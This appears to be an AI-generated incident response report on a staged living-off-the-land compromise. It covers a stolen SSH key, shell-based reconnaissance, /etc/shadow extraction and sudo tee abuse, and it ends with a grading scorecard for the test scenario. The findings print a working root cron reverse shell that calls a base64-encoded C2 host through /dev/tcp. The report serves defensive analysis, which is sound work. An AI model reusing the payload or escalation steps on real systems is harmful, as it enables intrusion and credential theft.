# Incident Response Report — app-prod-12
## Scenario 12: Living-off-the-Land (LotL) Compromise

| Field | Value |
|-------|-------|
| **Case** | attack-scenario-12-lotl |
| **Host** | app-prod-12 |
| **Analyst** | findevil autonomous IR agent |
| **Report Date** | 2026-04-23T00:00:00Z |
| **Verdict** | **COMPROMISED** (high confidence) |
| **Initial Access** | Stolen SSH private key — `deploy` account |
| **C2 IP:Port** | `192.0.2.200:4444` |
| **Attacker Source IP** | `198.51.100.42` |

---

## Executive Summary

The `deploy` CI account on app-prod-12 was taken over on **2026-04-18** using a stolen SSH private key. The attacker connected from `198.51.100.42` at 13:42:51 UTC and conducted a comprehensive post-compromise reconnaissance session using only standard Linux built-in tools and utilities — no new binaries were dropped at any point. The session concluded with the installation of a persistent root-level reverse shell disguised as a log rotation cron job (`/etc/cron.d/log-rotation-check`). The C2 address (`192.0.2.200:4444`) was base64-encoded inside the cron entry to defeat signature-based IP detection. The reverse shell uses the bash `/dev/tcp` built-in rather than `nc`, `socat`, or any external network utility.

The attack demonstrates a full LotL kill chain: initial access via stolen credential → recon via built-in tools → credential exfiltration via terminal paste → persistence via `sudo tee` GTFOBins abuse.

---

## Timeline of Events (UTC)

| Timestamp | Actor | Source IP | Action | Evidence |
|-----------|-------|-----------|--------|----------|
| 2026-04-18 08:14:02 | alice | 10.0.2.15 | Legitimate SSH login (publickey) | auth.log:3 |
| 2026-04-18 08:15:42 | alice | 10.0.2.15 | sudo journalctl (nginx review) | auth.log:5 |
| 2026-04-18 13:42:51 | **deploy** | **198.51.100.42** | **SSH login with stolen key** | auth.log:7 |
| 2026-04-18 13:43:02 | deploy | 198.51.100.42 | `sudo systemctl restart nginx` (cover) | auth.log:9 |
| 2026-04-18 13:43:xx | deploy | 198.51.100.42 | Web root enumeration (`ls`, `find *.php`) | bash_history:1-3 |
| 2026-04-18 13:44:xx | deploy | 198.51.100.42 | Internal probe: `curl http://10.0.1.10:8080/deploy-webhook` | bash_history:4 |
| 2026-04-18 13:44:xx | deploy | 198.51.100.42 | SUID binary enumeration: `find / -perm -4000` | bash_history:7 |
| 2026-04-18 13:44:xx | deploy | 198.51.100.42 | Writable directory enumeration: `find / -writable -type d` | bash_history:8 |
| 2026-04-18 13:45:xx | deploy | 198.51.100.42 | `/etc/passwd` parsing via `awk` | bash_history:9 |
| 2026-04-18 13:45:xx | deploy | 198.51.100.42 | `/etc/shadow` read and `base64` encode (exfiltration) | bash_history:10-11 |
| 2026-04-18 13:46:xx | deploy | 198.51.100.42 | Sudoers enumeration: `cat /etc/sudoers.d/*` | bash_history:12 |
| 2026-04-18 13:46:xx | deploy | 198.51.100.42 | SSH key discovery: `find /home -name authorized_keys` | bash_history:13 |
| 2026-04-18 13:46:xx | deploy | 198.51.100.42 | History file discovery: `find /home -name .bash_history` | bash_history:14 |
| 2026-04-18 13:47:18 | deploy | 198.51.100.42 | **Persistence installed via `sudo tee /etc/cron.d/log-rotation-check`** | auth.log:10 |
| 2026-04-18 13:47:22 | deploy | 198.51.100.42 | `sudo chmod 644 /etc/cron.d/log-rotation-check` | auth.log:11 |
| 2026-04-18 13:47:35 | deploy | 198.51.100.42 | **`sudo systemctl restart cron` (activates reverse shell)** | auth.log:12 |
| 2026-04-18 13:47:xx | deploy | 198.51.100.42 | `history -c` (anti-forensics attempt) | bash_history:18 |

---

## Findings

### Finding 1 — Initial Access: Stolen SSH Private Key (CONFIRMED)

The `deploy` account authenticated successfully to SSH at **13:42:51 UTC from `198.51.100.42`** using publickey authentication. This IP is external/untrusted; the `deploy` CI account would be expected to authenticate only from known CI infrastructure (e.g., `10.0.x.x`). There were **zero failed login attempts** in the entire auth log, confirming the attacker possessed a valid private key — this was not a brute force attack.

- **Source IP:** `198.51.100.42` (not in local IOC cache; no prior legitimate logins from this IP)
- **Method:** publickey (SSH key theft, not password-based)
- **Control bypassed:** `PasswordAuthentication no` in sshd_config is ineffective against stolen key material
- **Verification:** SUPPORTED (auth.log:7)

### Finding 2 — Post-Compromise Reconnaissance: LotL Enumeration (CONFIRMED)

The attacker performed comprehensive host enumeration using only standard Linux utilities. No external binaries were downloaded or executed. The full sequence from `deploy` bash_history:

| Command | Purpose | LotL Binary |
|---------|---------|-------------|
| `find / -perm -4000 -type f` | SUID binary discovery (privilege escalation paths) | `find` |
| `find / -writable -type d` | Writable directory discovery | `find` |
| `awk -F: '{print $1":"$3":"$7}' /etc/passwd` | Account enumeration (UIDs, shells) | `awk` |
| `while read u; do grep "^${u}:" /etc/shadow; done` | Shadow file extraction per user | `bash`, `grep` |
| `base64 /etc/shadow` | Shadow credential exfiltration via terminal | `base64` |
| `cat /etc/sudoers.d/*` | Privilege escalation surface mapping | `cat` |
| `find /home -name "authorized_keys"` | Lateral movement path discovery | `find` |
| `find /home -name ".bash_history"` | Operational security awareness | `find` |
| `curl -s http://10.0.1.10:8080/deploy-webhook` | Internal network probe | `curl` |

**Credential exfiltration confirmed:** `/etc/shadow` was read and base64-encoded, the encoded output would have been copy-pasted from the terminal session — no network binary required.

### Finding 3 — Persistence: Root-Level Reverse Shell in Cron (CONFIRMED)

**File:** `/etc/cron.d/log-rotation-check`  
**Deception:** Named to appear as a legitimate system maintenance task.

**Full cron entry:**
```
*/5 * * * * root _H=$(echo "MTkyLjAuMi4yMDA=" | base64 -d); _P=$(echo "NDQ0NA==" | base64 -d); exec 3<>/dev/tcp/${_H}/${_P}; while read -u 3 _c; do eval "${_c}" >&3 2>&3; done
```

**Decoded values:**
- `MTkyLjAuMi4yMDA=` → `192.0.2.200` (C2 IP)
- `NDQ0NA==` → `4444` (C2 port)

**LotL evasion techniques used:**

| Technique | Detail |
|-----------|--------|
| Deceptive name | `log-rotation-check` — mimics legitimate cron job names |
| Bash `/dev/tcp` builtin | No `nc`, `socat`, or other network binary required |
| Base64-encoded C2 address | Defeats literal-IP and literal-domain signature matching |
| `exec 3<>` fd redirect | No external process for the network socket |
| `eval` command loop | Executes arbitrary commands received from C2 over fd 3 |
| Runs as `root` | Full system access on every callback |
| Installed via `sudo tee` | GTFOBins abuse — `tee` allowed in `deploy` sudoers, used to write to privileged paths |

**Schedule:** Executes every 5 minutes as root. As of evidence collection (2026-04-18), the cron daemon was restarted at 13:47:35 UTC, meaning the first callback to `192.0.2.200:4444` would have occurred within 5 minutes of installation.

- **Verification:** SUPPORTED by `find_persistence` (HIGH severity), `verify_finding` (SUPPORTED), auth.log:10-12

### Finding 4 — Privilege Abuse: GTFOBins via `sudo tee` (CONFIRMED)

The `deploy` account had `sudo` access to `/usr/bin/tee`. The attacker piped the malicious cron payload through `tee` with sudo elevation to write to `/etc/cron.d/log-rotation-check` — a root-owned directory not normally writable by service accounts. This is a documented GTFOBins escalation path: any account with `sudo tee` can write arbitrary content to any file on the system.

```bash
echo '*/5 * * * * root ...' | sudo tee /etc/cron.d/log-rotation-check
sudo chmod 644 /etc/cron.d/log-rotation-check
sudo systemctl restart cron
```

- **Verification:** SUPPORTED (auth.log:10-12, bash_history:15-17)

### Finding 5 — Anti-Forensics: History Clear Attempt (PARTIAL)

The attacker executed `history -c` as the final command of the session to erase the in-memory bash command history. The attempt was **partially effective**: the bash history file (`/home/deploy/.bash_history`) was already written to disk before the clear command ran (default bash behavior is to append at session end), preserving the full 18-line session record. This is a common anti-forensics failure — `history -c` clears the in-memory list but does not truncate an already-flushed HISTFILE.

---

## Indicators of Compromise

| Type | Value | Context |
|------|-------|---------|
| IP (attacker source) | `198.51.100.42` | SSH session origin for `deploy` account takeover |
| IP (C2) | `192.0.2.200` | Reverse shell callback target (base64: `MTkyLjAuMi4yMDA=`) |
| Port (C2) | `4444` | Reverse shell callback port (base64: `NDQ0NA==`) |
| File (persistence) | `/etc/cron.d/log-rotation-check` | Malicious cron entry, runs as root every 5 min |
| Account (compromised) | `deploy` (UID 1001) | CI service account with elevated sudo privileges |
| Base64 string | `MTkyLjAuMi4yMDA=` | Encoded C2 IP in cron persistence |
| Base64 string | `NDQ0NA==` | Encoded C2 port in cron persistence |

---

## Attack Chain Summary

```
[Stolen SSH Key]
      │
      ▼
SSH login as deploy from 198.51.100.42          (13:42:51 UTC)
      │
      ▼
Cover action: sudo systemctl restart nginx      (13:43:02 UTC)
      │
      ▼
LotL Recon: find/awk/grep/base64/cat            (~13:43-13:46 UTC)
  ├─ SUID/writable path enumeration
  ├─ /etc/passwd + /etc/shadow exfiltration
  └─ Sudo/SSH/history surface mapping
      │
      ▼
Persistence: sudo tee /etc/cron.d/log-rotation-check    (13:47:18 UTC)
  └─ Bash /dev/tcp reverse shell to 192.0.2.200:4444
  └─ Base64-encoded C2 address, eval loop, runs as root
      │
      ▼
sudo systemctl restart cron                     (13:47:35 UTC)
      │
      ▼
history -c (anti-forensics attempt)
      │
      ▼
[Active reverse shell callbacks every 5 minutes]
```

---

## Detection Notes

This attack is specifically designed to evade common detection heuristics:

- **No dropped binaries** → file-reputation and AV-based detection ineffective
- **No `wget`, `curl` (for payloads), `nc`, `socat`** → binary name allowlisting ineffective
- **No literal IP in cron** → regex-based IP matching in cron files ineffective
- **Innocuous cron job name** → manual review without decoding will miss it
- **`/dev/tcp` builtin** → process-level network monitoring may not attribute the socket to a shell

**What did work:**
- Bash history preserved despite `history -c` (timing of flush)
- `find_persistence` scanner flagged the cron entry via behavioral heuristics (reverse-shell pattern, obfuscated eval loop), not name matching
- Auth log source IP anomaly (external IP on a CI account)
- `sudo tee` on a cron path is a strong behavioral indicator

---

## Recommended Remediation

1. **Immediate:** Remove `/etc/cron.d/log-rotation-check` and block outbound connections to `192.0.2.200:4444` at the perimeter firewall.
2. **Revoke:** Rotate all SSH keys for the `deploy` account; audit which CI systems held the now-compromised private key.
3. **Credential reset:** Treat all `/etc/shadow` hashes as exposed — force password rotation for `deploy` and `alice`.
4. **Sudo hardening:** Remove `tee`, `chmod`, and `systemctl restart cron` from the `deploy` sudoers configuration. CI accounts should use the minimum sudo surface required.
5. **Key management audit:** Determine how the `deploy` SSH private key was obtained — CI secrets storage, developer workstation compromise, or SCM exposure.
6. **Monitoring:** Alert on `sudo tee` to any path under `/etc/cron*`, `/etc/systemd/`, or other persistence-relevant directories.
7. **Lateral movement:** The internal webhook probe (`10.0.1.10:8080`) suggests the attacker was mapping internal services — audit access logs on that endpoint for follow-on activity.

---

## Evidence Provenance

| Artifact | Path | Key Content |
|----------|------|-------------|
| Auth log | `auth.log` | SSH logins, all sudo commands |
| Bash history | `fs/home/deploy/.bash_history` | Full 18-command attacker session |
| Cron persistence | `fs/etc/cron.d/log-rotation-check` | Base64-encoded LotL reverse shell |
| passwd | `fs/etc/passwd` | Account inventory (deploy UID 1001, alice UID 1002) |
| shadow | `fs/etc/shadow` | Confirms shadow accessible; hashes present |
| sshd_config | `fs/etc/ssh/sshd_config` | Hardened (pubkey only) — key theft vector confirmed |

*All findings independently verified via `verify_finding`. Contradiction check across all claims: no contradictions detected.*

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["12"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 3/3 | **100%** |
| Cross-scenario markers absent | 9/9 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
